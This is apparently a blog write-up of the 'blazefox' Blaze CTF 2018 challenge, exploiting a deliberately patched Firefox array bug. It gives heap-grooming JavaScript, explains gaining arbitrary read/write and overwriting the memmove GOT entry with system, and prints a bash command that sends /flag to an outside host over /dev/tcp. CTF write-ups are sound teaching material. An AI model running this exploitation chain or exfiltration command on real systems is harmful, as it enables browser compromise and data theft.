---
layout: post
title: blazefox - Blaze CTF 2018
date: '2018-04-27 19:00:00'
---

> No one gave us a firefox 0day last year, so we'll make it a little easier for you this time.
> 
> nc blazefox.420blaze.in 1337
> 
> [blaze patch and instructions for rolling](https://github.com/vakzz/ctfs/raw/master/Blaze2018/blazefox/blaze_firefox_small.tar.gz)
> 
> also smoke this [fully built binary](https://s3.us-east-2.amazonaws.com/blazefox/blazefox/blaze_firefox_dist_large.tar.gz) (600 MB)
> 
> Author : itsZN


*420 points, 9 Solves, pwn*

We are given a nigthly version of firefox that has been patched to add a new function to arrays called `blaze`, which modifies the capacity of the array to be 420 without acutally updating the underlying storage. This allows us to read and write to arbitrary data that is located just after the array.

I relied heavily on  [Share with care: Exploiting a Firefox UAF with shared array buffers](https://phoenhex.re/2017-06-21/firefox-structuredclone-refleak#turning-a-use-after-free-into-a-readwrite-primitive) for this challenge.

The general idea was to allocate an `Array` followed by two small `ArrayBuffer`s (so that they have their data inline) and use the `blaze` method on the inital array to access and modify the length of the first `ArrayBuffer`. By placing a magic value in the second `ArrayBuffer`, we can locate the index of this, and then work backwards to change the header allowing us to read/write to anywhere.

```javascript
arr = [0x11223344];

ab = new ArrayBuffer(32);
overwrite_len = new Uint32Array(ab);
overwrite_len[0] = 0x77777777;

victim_ab = new ArrayBuffer(32);
victim = new Uint32Array(victim_ab);
victim[0] = 0x88888888;
```

Looking for `0x11223344` in gdb shows finds two locations, and examining the second one shows us what we are after: 

![gdb](/assets/blaze18/firefox_gdb.jpg)

We can see the size `0xfff8800000000008` that we want to modify, which we can do by calling `arr.blaze()` then setting `arr[7] = 0x10000;`.  This allows us to iterate through the first array buffer and find the contents of the second array buffer.

![gdb](/assets/blaze18/firefox_gdb2.jpg)

The memory location of the second array buffer is at `0x00007f89218d60c0` but shifted to the right by one, so shifting` 0x00003fc490c6b070<<1 == 0x7f89218d60e0` which is where we can see `0x88888888`.

We can now modify this value to any address we want (right shifted) using the first array buffer, then use the second array buffer to read or write to the new arbitary address.

The next part of the exploit was taken straight from <https://github.com/phoenhex/files/blob/master/exploits/share-with-care/exploit.js> with just changing a few offsets. The basic idea was to leak a native function `Date.now` and calculate the base address of libxul.so, then leak a GOT entry and calculate the base address of libc and then have `system`. We then overwrite the `memmove` got with system and trigger a copy with our payload to copy the flag `bash -ic 'cat /flag > /dev/tcp/my.host/12345' &`

`flag{fire_just_makes_the_blaze_better}`

[Full exploit code here.](https://github.com/vakzz/ctfs/blob/master/Blaze2018/blazefox/exploit.html
